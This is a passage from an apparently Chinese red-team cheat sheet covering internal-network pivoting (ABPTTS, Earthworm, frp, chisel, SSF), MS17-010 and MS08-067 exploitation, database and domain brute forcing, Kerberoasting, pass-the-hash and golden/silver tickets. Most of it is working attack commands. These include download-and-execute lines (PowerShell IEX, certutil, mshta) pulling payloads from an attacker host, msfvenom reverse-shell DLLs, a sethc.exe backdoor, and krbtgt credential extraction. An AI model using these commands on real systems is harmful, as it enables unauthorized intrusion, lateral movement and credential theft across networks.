src="./img/337.png" alt="image"></p><h5 id="ABPTTS端口转发"><a href="#ABPTTS端口转发" class="headerlink" title="ABPTTS端口转发"></a>ABPTTS端口转发</h5><pre><code>https://github.com/nccgroup/ABPTTS端口转发&gt;python abpttsfactory.py -o webshell 生成shell./webshell目录下生成的相应脚本文件传入目标中&gt;python abpttsclient.py -c webshell/config.txt -u &quot;http://目标网址/trans.aspx&quot; -f 攻击机IP:12345/目标IP:3389</code></pre><p><img src="./img/338.png" alt="image"><br><img src="./img/339.png" alt="image"><br><img src="./img/340.png" alt="image"></p><pre><code>ABPTTS转发内网其他机器端口&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389</code></pre><p><img src="./img/341.png" alt="image"><br><img src="./img/342.png" alt="image"></p><pre><code>要转发多个机器或多个端口&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389 -f 192.168.0.107:33891/10.1.1.101:80 -f 192.168.0.107:33892/10.1.1.102:22SSH代理一级网段需要一台有权限的Linux靶机&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.108:22&gt;ssh -p 222 -qTfnN -D 0.0.0.0:1081 root@192.168.0.107</code></pre><p><img src="./img/343.png" alt="image"></p><pre><code>配置proxychains即可</code></pre><p><img src="./img/344.png" alt="image"></p><pre><code>SSH代理二级网段需要靶机web权限，一级内网一台web权限转发内网web出来传入abptts的shell&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:8080/10.1.1.108:80 &gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.107/qq.aspx -f 192.168.0.107:222/10.1.1.106:22SSH连接192.168.0.107:222即可到达二级网络反弹msfkali生成bind型脚本&gt;msfvenom -p linux/x64/shell_bind_tcp LPORT=12138 -f elf -o shell在二级不出网linux上执行将他的12138端口通过abptts转出&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:13128/10.1.1.101:12138Msf本地监听13128即可</code></pre><h5 id="Tunna转发"><a href="#Tunna转发" class="headerlink" title="Tunna转发"></a>Tunna转发</h5><pre><code>&gt;python proxy.py -u http://192.168.0.98/tunnel.aspx -l 12138 -r 3389 –v</code></pre><p><img src="./img/345.png" alt="image"></p><h4 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h4><p><img src="./img/346.png" alt="image"></p><h5 id="正向-目标机存在外网IP-："><a href="#正向-目标机存在外网IP-：" class="headerlink" title="正向(目标机存在外网IP)："></a>正向(目标机存在外网IP)：</h5><pre><code>&gt;ew –s ssocksd –l 888连接sockscap64靶机外网IP+端口888</code></pre><h5 id="反弹socks5-目标机无外网IP-："><a href="#反弹socks5-目标机无外网IP-：" class="headerlink" title="反弹socks5(目标机无外网IP)："></a>反弹socks5(目标机无外网IP)：</h5><pre><code>外网攻击机：&gt;ew -s rcsocks -l 1008 -e 888-l为socks软件连接的端口，-e为目标主机和vps的通信端口。靶机:&gt;ew -s rssocks -d 外网IP -e 1008 sockscap64连接攻击机外网IP+端口1008</code></pre><h5 id="二级环境-A有外网，B内网无外网-："><a href="#二级环境-A有外网，B内网无外网-：" class="headerlink" title="二级环境(A有外网，B内网无外网)："></a>二级环境(A有外网，B内网无外网)：</h5><pre><code>靶机B:&gt;ew –s ssocksd –l 888靶机A:&gt;ew –s lcx_tran –l 1080 –f 靶机B –g 888Sockscap64连接靶机外网IP+端口 1080</code></pre><h5 id="二级环境-A无外网，B内网无外网-："><a href="#二级环境-A无外网，B内网无外网-：" class="headerlink" title="二级环境(A无外网，B内网无外网)："></a>二级环境(A无外网，B内网无外网)：</h5><pre><code>外网攻击机：&gt;ew –s lcx_listen –l 10800 –e 888靶机B：&gt;ew –s ssocksd –l 999靶机A:&gt;ew -s lcx_slave -d 外网 -e 8888 -f 靶机B -g 9999 Sockscap64连接攻击机外网IP+端口 10080</code></pre><h5 id="三级环境-A无外网-B内网无外网通A-C通B-："><a href="#三级环境-A无外网-B内网无外网通A-C通B-：" class="headerlink" title="三级环境(A无外网,B内网无外网通A,C通B)："></a>三级环境(A无外网,B内网无外网通A,C通B)：</h5><pre><code>外网攻击机：&gt;ew -s rcsocks -l 1008 -e 888靶机A：&gt;ew -s lcx_slave -d 外网攻击机 -e 888 -f 靶机B -g 999靶机B：&gt;ew -s lcx_listen -l 999 -e 777靶机C:&gt;ew -s rssocks -d靶机B -e 777Sockscap64连接攻击机外网IP+端口 1008</code></pre><h4 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h4><pre><code>https://github.com/fatedier/frp/releases/使用条件:目标主机通外网，拥有自己的公网ip对攻击机外网服务端frps.ini进行配置[common]bind_port=8080靶机客户端[common]server_addr=服务器端外网IPserver_port=8080[socks5]type=tcpremote_port=12345plugin=socks5use_encryption=trueuse_compression=true以上是启用加密和压缩，能躲避流量分析设备。上传frpc.exe和frpc.ini到目标服务器上,直接运行frpc.exe（在实战中可能会提示找不到配置文件，需要使用-c参数指定配置文件的路径frpc.exe -c 文件路径），可以修改文件名和配置名以混淆视听。公网vps主机上运行./frps –c frps.ini靶机执行./frpc –c frpc.ini</code></pre><p><img src="./img/347.png" alt="image"></p><pre><code>MSF中设置全局变量&gt;setg proxies 公网IP:12345&gt;setg ReverseAllowProxy true 运行反向代理</code></pre><p><img src="./img/348.png" alt="image"><br><img src="./img/349.png" alt="image"></p><pre><code>结束攻击tasklist taskkill /pid 进程号 -t –f</code></pre><h4 id="SSF-1"><a href="#SSF-1" class="headerlink" title="SSF"></a>SSF</h4><pre><code>https://github.com/securesocketfunneling/ssf/releases</code></pre><h5 id="正向socks代理"><a href="#正向socks代理" class="headerlink" title="正向socks代理"></a>正向socks代理</h5><pre><code>边界机器执行：&gt;ssfd.exe -p 1080 linux执行：./ssfd -p 1080</code></pre><p><img src="./img/350.png" alt="image"></p><pre><code>攻击机执行：&gt;ssf.exe -D 12138 -p 1080 192.168.0.98(边界机器IP)</code></pre><p><img src="./img/351.png" alt="image"></p><pre><code>本机配置proxychain或proxifier</code></pre><p><img src="./img/352.png" alt="image"></p><h5 id="反向socks代理"><a href="#反向socks代理" class="headerlink" title="反向socks代理"></a>反向socks代理</h5><pre><code>攻击机执行：&gt;ssfd.exe -p 1080</code></pre><p><img src="./img/353.png" alt="image"></p><pre><code>内网机器执行：&gt;ssf.exe -F 12138 -p 1080 192.168.0.106(攻击机IP)</code></pre><p><img src="./img/354.png" alt="image"><br><img src="./img/355.png" alt="image"></p><h5 id="多级级联"><a href="#多级级联" class="headerlink" title="多级级联"></a>多级级联</h5><pre><code>多级内网机执行：&gt;ssfd.exe -p 1080 -c config.jsonJson文件加入字段&quot;circuit&quot;: [ &#123;&quot;host&quot;: &quot;A中继机IP&quot;, &quot;port&quot;:&quot;1080&quot;&#125;, &#123;&quot;host&quot;: &quot;B中继机IP&quot;, &quot;port&quot;:&quot;1080&quot;&#125; ],所有中继机执行：&gt;ssfd.exe -p 1080 -c config.json边界机器执行：&gt;ssf.exe -c config.json -p 1080 多级内网机IP -X 12138边界机执行：&gt;nc.exe 127.0.0.1 12138即可获得多级内网机cmdshell</code></pre><h5 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code>攻击机执行：&gt;ssfd.exe -p 1080 -c config.json</code></pre><p><img src="./img/356.png" alt="image"></p><pre><code>内网机器执行：</code></pre><p><img src="./img/357.png" alt="image"></p><pre><code>攻击机执行：&gt;nc 127.0.0.1 12138</code></pre><p><img src="./img/358.png" alt="image"></p><h4 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h4><pre><code>https://github.com/shadowsocks/libQtShadowsocks/releases/download/v2.0.2/shadowsocks-libqss-v2.0.2-win64.7z靶机新建配置文件1.json，内容为&#123;&quot;server&quot;:&quot;0.0.0.0&quot;,&quot;server_port&quot;:13337,&quot;local_address&quot;:&quot;127.0.0.1&quot;,&quot;local_port&quot;:1080,&quot;password&quot;:&quot;123456&quot;,&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;,&quot;fast_open&quot;:false,&quot;workers&quot;: 1&#125;执行&gt;shadowsocks-libqss.exe -c 1.json –S攻击机配置</code></pre><p><img src="./img/359.png" alt="image"></p><pre><code>浏览器或其他攻击软件配置代理127.0.0.1:1080即可(需有http(s)/socks5功能)</code></pre><p><img src="./img/360.png" alt="image"><br><img src="./img/361.png" alt="image"></p><h4 id="Goproxy"><a href="#Goproxy" class="headerlink" title="Goproxy"></a>Goproxy</h4><pre><code>https://github.com/snail007/goproxy/releases靶机执行&gt;proxy.exe socks -t tcp -p &quot;0.0.0.0:13337&quot;</code></pre><p><img src="./img/362.png" alt="image"></p><pre><code>攻击机配置Proxifier</code></pre><p><img src="./img/363.png" alt="image"></p><h4 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h4><pre><code>https://github.com/jpillora/chisel/releases攻击机监听&gt;chisel.exe server -p 12138 --reverse</code></pre><p><img src="./img/364.png" alt="image"></p><pre><code>靶机执行&gt;chisel.exe client 192.168.0.102:12138 R:12345:127.0.0.1:12346</code></pre><p><img src="./img/365.png" alt="image"></p><pre><code>靶机执行&gt;chisel.exe server -p 12346 --socks5</code></pre><p><img src="./img/366.png" alt="image"></p><pre><code>攻击机执行&gt;chisel.exe client 127.0.0.1:12345 socks</code></pre><p><img src="./img/367.png" alt="image"></p><pre><code>当隧道建立成功时，攻击机本地会启动1080端口</code></pre><p><img src="./img/368.png" alt="image"></p><pre><code>即可使用</code></pre><h4 id="代理软件"><a href="#代理软件" class="headerlink" title="代理软件"></a>代理软件</h4><pre><code>Sockscap64Proxifier Proxychains#vim /etc/proxychains.conf去掉dynamic_chain注释&gt;添加socks4 127.0.0.1 1080#cp /usr/lib/proxychains3/proxyresolv /usr/bin</code></pre><h3 id="Ngrok内网穿透"><a href="#Ngrok内网穿透" class="headerlink" title="Ngrok内网穿透"></a>Ngrok内网穿透</h3><pre><code>https://ngrok.com/https://www.ngrok.cc/下载ngrok#ngrok authtoken 授权码#ngrok http 8080#ngrok tcp 8888</code></pre><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><pre><code>扫描#use auxiliary/scanner/smb/smb_ms17_010#set rhosts 192.168.1.0/24&amp;#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms17-010.nse 10.11.1.0/20攻击#use exploit/windows/smb/ms_17_010_eternalblue易蓝屏#set payload windows/x64/meterpreter/reverse_tcp#use auxiliary/admin/smb/ms17_010_command#set command REG ADD \&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\&quot; /t REG_SZ /v Debugger /d \&quot;C:\\windows\\system32\\cmd.exe\&quot; /f</code></pre><h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08_067"></a>MS08_067</h3><pre><code>#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms08-067.nse 10.11.1.0/20#use exploit/windows/smb/ms08_067_netapi#set payload windows/meterpreter/reverse_tcpCVE-2019-0708</code></pre><h3 id="攻击MySQL数据库"><a href="#攻击MySQL数据库" class="headerlink" title="攻击MySQL数据库"></a>攻击MySQL数据库</h3><pre><code>#use auxiliary/scanner/mysql/mysql_version 主机发现#use auxiliary/scanner/mysql/mysql_login MYSQL爆破#use exploit/multi/mysql/mysql_udf_payload UDF提权#use exploit/windows/mysql/mysql_mof MOF提权#use auxiliary/admin/mysql/mysql_sql 执行命令</code></pre><h3 id="攻击MSSQL数据库"><a href="#攻击MSSQL数据库" class="headerlink" title="攻击MSSQL数据库"></a>攻击MSSQL数据库</h3><pre><code>&gt;PowerShell -Command &quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot; 列出域内mssql主机https://github.com/NetSPI/PowerUpSQL&gt;Get-SQLInstanceLocal          #发现本机SQLServer实例&gt;Get-SQLInstanceDomain         #发现域中的SQLServer实例&gt;Get-SQLInstanceBroadcast      #发现工作组SQLServer实例&gt;$Targets = Get-SQLInstanceBroadcast -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; 工作组mssql爆破&gt;$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; &gt;Get-SQLInstanceBroadcast -Verbose | Get-SQLServerLoginDefaultPw –Verbose&gt;$Targets 域内MSSQL爆破Nishang脚本爆破MSSQL&gt;Invoke-BruteForce -ComputerName dc.zone.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose -StopOnSuccess#use auxiliary/scanner/mssql/mssql_login 爆破主机#use auxiliary/admin/mssql/mssql_exec 调用cmd#use auxiliary/admin/mssql/mssql_sql 执行SQL语句#use exploit/windows/mssql/mssql_payload 上线MSSQL主机http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1导入nishang执行MSSQL命令的脚本&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1&#39;)&gt;Execute-Command-MSSQL -ComputerName 192.168.0.98 -UserName sa -Password admin 会返回powershell#use auxiliary/scanner/mssql/mssql_hashdump 导出MSSQL密码已知服务器ntlmhash，未知mssql账号密码Hash注入+socks无密码连接mssql&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:. /ntlm:&#123;hash&#125; /run:\&quot;C:\*\SocksCap64\SocksCap64_RunAsAdmin.exe\&quot;&quot; &quot;exit&quot;将SSMS.exe加入sockscap中启动命令行版sqltoolhttps://github.com/uknowsec/SharpSQLTools</code></pre><h3 id="隔离主机payload"><a href="#隔离主机payload" class="headerlink" title="隔离主机payload"></a>隔离主机payload</h3><pre><code>隔离主机一般与攻击机无双向路由，payload设置为bind让靶机监听。&gt;set payload windows/meterpreter/bind_tcp&gt;set RHOST 隔离机IP</code></pre><p><img src="./img/369.png" alt="image"></p><h3 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破"></a>爆破</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><pre><code>参数：-l 指定的用户名 -p 指定密码-L 用户名字典  -P 密码字典-s 指定端口 -o 输出文件&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V&gt;hydra -L /root/user.txt -P pass.txt smb 10.1.1.10 -vV&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10</code></pre><h4 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h4><pre><code>参数：-h 目标名或IP  -H 目标列表-u 用户名 -U 用户名字典-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程-n 指定端口 -e ns 尝试空密码和用户名密码相同&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql</code></pre><h4 id="域内爆破"><a href="#域内爆破" class="headerlink" title="域内爆破"></a>域内爆破</h4><h5 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h5><pre><code>https://github.com/ropnop/kerbrute用户枚举&gt;kerbrute_windows_amd64.exe userenum -d zone.com username.txt</code></pre><p><img src="./img/371.png" alt="image"><br>    密码喷射<br>    &gt;kerbrute_windows_amd64.exe passwordspray -d zone.com use.txt password<br><img src="./img/372.png" alt="image"></p><pre><code>密码爆破此项会产生日志&gt;kerbrute_windows_amd64.exe bruteuser -d zone.com pass.txt name</code></pre><p><img src="./img/373.png" alt="image"></p><pre><code>组合爆破格式为username:password&gt;kerbrute_windows_amd64.exe -d zone.com bruteforce com.txt</code></pre><h5 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h5><pre><code>https://github.com/dafthack/DomainPasswordSpray自动收集账户进行密码喷射&gt;Invoke-DomainPasswordSpray -Password pass</code></pre><p><img src="./img/374.png" alt="image"></p><pre><code>组合爆破&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -PasswordList passlist.txt -OutFile result.txt会产生日志单密码&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -Password password</code></pre><h3 id="方程式内网不产生session"><a href="#方程式内网不产生session" class="headerlink" title="方程式内网不产生session"></a>方程式内网不产生session</h3><pre><code>msfvenom生成一个x64或x86的dll文件，替换该工具下的x64.dll或x86.dllwindows server 2008 ，msfvenom生成x64.dll文件msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x64.dllmsf配置use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcpset lport 12345set lhost 192.168.0.107将该x64.dll替换到方程式利用工具下面。只需要更换目标的IP，就可以获取session。windows server 2003 ，msfvenom生成x86.dll文件msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x86.dllmsf配置use exploit/multi/handler set payload windows/meterpreter/reverse_tcpset lport 12345set lhost 192.168.0.107通过ms17_010_commend模块执行系统命令添加用户至管理员。再指定SMBPass和SMBUser来建立windows可访问命名管道</code></pre><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><pre><code> https://github.com/nidem/kerberoast </code></pre><h4 id="SPN发现"><a href="#SPN发现" class="headerlink" title="SPN发现"></a>SPN发现</h4><h5 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h5><pre><code>&gt;setspn -T 域名 -Q */*</code></pre><p><img src="./img/375.png" alt="image"></p><h5 id="Powershell-4"><a href="#Powershell-4" class="headerlink" title="Powershell"></a>Powershell</h5><p><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br><img src="./img/376.png" alt="image"></p><pre><code>Powerview&gt;Get-NetComputer -SPN termsrv*&gt;Get-NetUser -SPN</code></pre><p><img src="./img/377.png" alt="image"></p><pre><code>&gt;import module GetUserSPNs.ps1</code></pre><h5 id="Empire-2"><a href="#Empire-2" class="headerlink" title="Empire"></a>Empire</h5><pre><code>&gt;usemodule situational_awareness/network/get_spn</code></pre><h4 id="申请票据"><a href="#申请票据" class="headerlink" title="申请票据"></a>申请票据</h4><pre><code>&gt;Add-Type -AssemblyName System.IdentityModel&gt;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPN&quot;&amp;&gt;kerberos::ask /target:SPN</code></pre><h4 id="导出票据"><a href="#导出票据" class="headerlink" title="导出票据"></a>导出票据</h4><pre><code>mimikatz&gt;kerberos::list /export</code></pre><h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><pre><code>&gt;python tgsrepcrack.py word.txt file.kirbihttps://github.com/leechristensen/tgscrack&gt;python extractServiceTicketParts.py file.kirbi&gt;tgscrack.exe -hashfile hash.txt -wordlist word.txt</code></pre><h4 id="重写票据"><a href="#重写票据" class="headerlink" title="重写票据"></a>重写票据</h4><pre><code>&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -u 500&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -g 512注入内存、&gt;kerberos::ptt new.kirbi</code></pre><h4 id="GetUserSPNs"><a href="#GetUserSPNs" class="headerlink" title="GetUserSPNs"></a>GetUserSPNs</h4><pre><code>https://github.com/SecureAuthCorp/impacket请求TGS&gt;python GetUserSPNs.py -request -dc-ip 10.1.1.1 zone.com/y破解&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt</code></pre><h3 id="ASEPRoasting"><a href="#ASEPRoasting" class="headerlink" title="ASEPRoasting"></a>ASEPRoasting</h3><pre><code>当用户关闭了kerberos预身份认证时可以进行攻击</code></pre><p><img src="./img/378.png" alt="image"></p><pre><code>&gt;Rubeus.exe asreproast /user:y /dc:10.1.1.100 /domain:zone.com</code></pre><p><img src="./img/379.png" alt="image"></p><pre><code>或使用Powerview结合https://github.com/gold1029/ASREPRoast获取不要求kerberos预身份验证的域内用户&gt;Get-DomainUser -PreauthNotRequired -Properties distinguishedname –Verbose</code></pre><p><img src="./img/380.png" alt="image"></p><pre><code>&gt;Get-ASREPHash -UserName y -Domain zone.com -Verbose</code></pre><p><img src="./img/381.png" alt="image"></p><pre><code>破解RC4-HMAC AS-REP&gt;john hash.txt --wordlist=wordlist.txt</code></pre><p><img src="./img/382.png" alt="image"></p><h3 id="PASS-THE-HASH"><a href="#PASS-THE-HASH" class="headerlink" title="PASS-THE-HASH"></a>PASS-THE-HASH</h3><pre><code>允许本地管理组所有成员连接&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  </code></pre><h4 id="WMIExec-amp-TheHash"><a href="#WMIExec-amp-TheHash" class="headerlink" title="WMIExec &amp; TheHash"></a>WMIExec &amp; TheHash</h4><pre><code>&gt;powershell -ep bypass&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-TheHash/Invoke-WMIExec.ps1&#39;); &gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-TheHash/Invoke-TheHash.ps1&#39;);&gt;Invoke-TheHash -Type WMIExec -Target 192.168.0.0/24 -Domain zone.com -Username godadmin -Hash f1axxxxxxxxxb771</code></pre><p><img src="./img/383.png" alt="image"></p><h4 id="WMI-1"><a href="#WMI-1" class="headerlink" title="WMI"></a>WMI</h4><pre><code>&gt;net use \\1.1.1.1\admin$ /user:&quot;administrator&quot; &quot;password&quot;&gt;copy windowsupdate.exe \\1.1.1.1\admin$\dir\&gt;wmic /NODE:&quot;1.1.1.1&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\dir\windowsupdate.exe&quot; &gt;del \\1.1.1.1\admin$\dir\windowsupdate.exe /F &gt;net use \\1.1.1.1\admin$ /del</code></pre><h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h5><pre><code>https://github.com/SecureAuthCorp/impacket &gt;python wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 域名/Administrator@192.168.11.1 &quot;whoami&quot;&gt;python wmiexec.py admin@192.168.1.2</code></pre><p><img src="./img/384.png" alt="image"></p><h5 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h5><pre><code>半交互式：&gt;cscript //nologo wmiexec.vbs /shell 192.168.1.2 admin pass单条命令&gt;cscript //nologo wmiexec.vbs /cmd 192.168.1.2 domain\admin pass &quot;whoami&quot;下载执行&gt;wmic /node:192.168.0.115 /user:godadmin /password:password PROCESS call create &quot;cmd /c certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe c:/windows/temp/win.exe &amp; c:/windows/temp/win.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe delete&quot;</code></pre><p><img src="./img/385.png" alt="image"></p><h5 id="Powershell-5"><a href="#Powershell-5" class="headerlink" title="Powershell"></a>Powershell</h5><pre><code>&gt;wmic /NODE:192.168.3.108 /user:&quot;godadmin&quot; /password:&quot;password&quot; PROCESS call create &quot;powershell -nop -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/xxx.txt&#39;);\&quot;&quot;Invoke-WMIExec&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1a5b1a3641bec99ff92fe9df700b771 -Command \&quot;net user admin Qwe@123 /add\&quot; -Verbose&quot;</code></pre><p><img src="./img/386.png" alt="image"></p><pre><code>&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1xxxxxxxxxxxxx771 -Command \&quot;mshta http://192.168.0.107:8080/YAyAPN6odzbAzKn.hta\&quot; -Verbose&quot;</code></pre><p><img src="./img/387.png" alt="image"></p><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><pre><code>&gt;psexec.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09域名/Administrator@192.168.1.1 &quot;whoami&quot;&gt;psexec.exe –accepteula \\192.168.1.2 –u admin –p pass cmd.exe 无确认窗Msf#use exploit/windows/smb/psexec#use exploit/windows/smb/psexec_psh(powershell版本)</code></pre><h4 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>Windows XP、Vista、2008、7、2008 r2 和2012没有安装KB2871997补丁的机器上，使用NTLM进行PTHmimikatz # privilege::debugmimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125;执行一个文件mimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125; /run:powershell.exeWindows 8.1 、2012 R2、安装KB2871997的Win 7 、2008 R2和2012上可使用AES KEY进行PTH&gt;privilege::debug&gt;sekurlsa::ekeys&gt;sekurlsa::pth /user:administrator /domain:zone.com /aes128:&#123;key&#125;</code></pre><h4 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h4><pre><code>&gt;pth-winexe -U godadmin%password --system --ostype=1 //192.168.0.115 cmd</code></pre><p><img src="./img/388.png" alt="image"></p><h4 id="Smbexec"><a href="#Smbexec" class="headerlink" title="Smbexec"></a>Smbexec</h4><pre><code>&gt;python smbexec.py administrator@192.168.0.98</code></pre><p><img src="./img/389.png" alt="image"></p><h3 id="PASS-THE-TICKET"><a href="#PASS-THE-TICKET" class="headerlink" title="PASS-THE-TICKET"></a>PASS-THE-TICKET</h3><h4 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h4><pre><code>KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGSAS(Authentication Server)： 身份认证服务TGS(Ticket Granting Server)： 票据授予服务TGT(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</code></pre><h4 id="黄金票据-Mimikatz"><a href="#黄金票据-Mimikatz" class="headerlink" title="黄金票据+Mimikatz"></a>黄金票据+Mimikatz</h4><pre><code>Golden Ticket伪造TGT(Ticket Granting Ticket)，可以获取任何Kerberos服务权限，域控中提取krbtgt的hash域控：dc.zone.com域内机器：sub2k8.zone.com域内普通用户：y域内机器是不能访问dc上的文件</code></pre><p><img src="./img/390.png" alt="image"></p><pre><code>清空票据</code></pre><p><img src="./img/391.png" alt="image"></p><pre><code>域控中获取krbtgt用户的信息&gt;privilege::debug&gt;mimikatz log &quot;lsadump::dcsync /domain:zone.com /user:krbtgt&quot;获取信息：/domain、/sid、/aes256</code></pre><p><img src="./img/392.png" alt="image"></p><pre><code>在sub2k8中生成golden ticket&gt;mimikatz “kerberos::golden /krbtgt:&#123;ntlmhash&#125; /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi”</code></pre><p><img src="./img/393.png" alt="image"></p><pre><code>导入Mimikatz#kerberos::ptt 123.kirbi</code></pre><p><img src="./img/394.png" alt="image"></p><h4 id="白银票据-Mimikatz"><a href="#白银票据-Mimikatz" class="headerlink" title="白银票据+Mimikatz"></a>白银票据+Mimikatz</h4><p><img src="./img/395.png" alt="image"></p><pre><code>Silver Ticket是伪造的TGS，只能访问指定服务权限域控：dc.zone.com域内机器：sub2k8.zone.com域内普通用户：y域控中导出&gt;privilege::debug&gt;sekurlsa::logonpasswords</code></pre><p><img src="./img/396.png" alt="image"></p><pre><code>Sub2k8伪造票据&gt;mimikatz &quot;kerberos::golden /domain:zone.com /sid:&#123;SID&#125; /target:dc.zone.com /service:cifs /rc4:&#123;NTLM&#125; /user:y /ptt&quot;</code></pre><p><img src="./img/397.png" alt="image"></p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><pre><code>https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe域控：dc.zone.com/10.1.1.100域内机器：sub2k8.zone.com/10.1.1.98域内普通用户：y，Sub2k8中清除票据Mimikatz#kerberos::purge&gt;whoami /user查看SID 创建ccache票据文件&gt; MS14-068.exe -u y@zone.com -p password -s S-1-5-21-2346829310-1781191092-2540298887-1112 -d dc.zone.com注入票据Mimikatz# Kerberos::ptc c:\xx\xx\xxx.ccachepsexec无密码登陆&gt;PsExec.exe \\dc.xx.com\ cmd.exe</code></pre><h4 id="Mimikatz-MSF"><a href="#Mimikatz-MSF" class="headerlink" 